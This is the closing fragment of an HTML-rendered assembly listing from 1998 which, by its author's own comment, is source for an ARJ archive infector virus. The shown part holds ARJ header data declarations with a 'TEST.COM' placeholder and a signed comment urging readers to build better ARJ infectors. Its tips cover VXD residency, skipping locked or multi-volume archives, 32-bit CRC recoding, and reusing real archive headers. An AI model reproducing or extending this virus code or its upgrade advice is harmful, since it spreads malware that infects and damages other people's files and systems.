</span><span class="sc5">ArjEntryName</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Unknown (?)</span><span class="sc0">
</span><span class="sc5">ArjAttribute</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Attribute</span><span class="sc0">
</span><span class="sc5">ArjHostData</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Unknown May be unused</span><span class="sc0">

</span><span class="sc5">SecondSide</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">ArjFilename</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'TEST.COM'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; FileName with Null-End</span><span class="sc0">
</span><span class="sc5">ArjComment</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Comment with Null-End</span><span class="sc0">
</span><span class="sc5">ArjHeaderCrc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">            </span><span class="sc1">; Header Crc32</span><span class="sc0">
</span><span class="sc5">ArjExtended</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">; Extended Header - Unused</span><span class="sc0">

</span><span class="sc5">FinSide</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">fin</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">starttable</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">


</span><span class="sc1">; +------------------------------------------------------------------------+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Hep Littah'll coder, you wanna build a good arj infector? There are a lot</span><span class="sc0">
</span><span class="sc1">;  of tricks  you  can upgrade from my code  ,  first  , build a VXD  can be </span><span class="sc0">
</span><span class="sc1">;  the best thing to  do , second is  to detect if the  archive is locked or</span><span class="sc0">
</span><span class="sc1">;  see if the archive are in multi volume in that case ,don't infect at all! </span><span class="sc0">
</span><span class="sc1">;  you can also recode the CRC in 32 bits asm ,  it can be cool too. In this </span><span class="sc0">
</span><span class="sc1">;  code we work with our created header, you can put your program to use one </span><span class="sc0">
</span><span class="sc1">;  existing in the a real ARJ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Les petits dlinquants (C) Unkm'98 aka [StarZero/Ikx]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span></div></body>
</html>
